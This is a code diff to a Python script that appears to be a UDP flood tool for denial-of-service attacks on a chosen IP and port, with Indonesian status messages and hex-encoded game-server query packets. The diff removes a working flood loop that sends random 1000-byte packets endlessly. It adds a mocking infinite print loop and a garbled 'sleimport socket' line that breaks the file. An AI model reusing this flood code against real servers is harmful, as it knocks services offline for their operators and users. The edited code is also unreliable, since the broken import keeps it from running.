@@ -1,4 +1,4 @@
-import socket
+sleimport socket
 import struct
 import codecs,sys
 import threading
@@ -26,21 +26,8 @@ Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                        ]
 
 
-def run(): 
-     data = random._urandom(1000) 
-     i = random.choice(("[*]","[!]","[#]")) 
-     while True: 
-         try: 
-             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
-             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
-             s.connect((ip,port)) 
-             s.send(data) 
-             for x in range(times): 
-                 s.send(data) 
-             print(i +" [!] PCSI/RTC/PDSI BERSIAP MENEMBUS IP => %s With Port : %s"%(orgip,port)) 
-         except socket.error: 
-             s.close() 
-             print("[!] PCSI/RTC/PDSI BERSIAP MENEMBUS IP => %s With Port : %s"%(orgip,port))
+while True:
+     print("[!] PCSI/RTC/PDSI COMMUNITY SIAP MENEMBUS IP ====> %s Dan Memberi Kopi Ke Port %s"%(orgip,port))
             
 
 
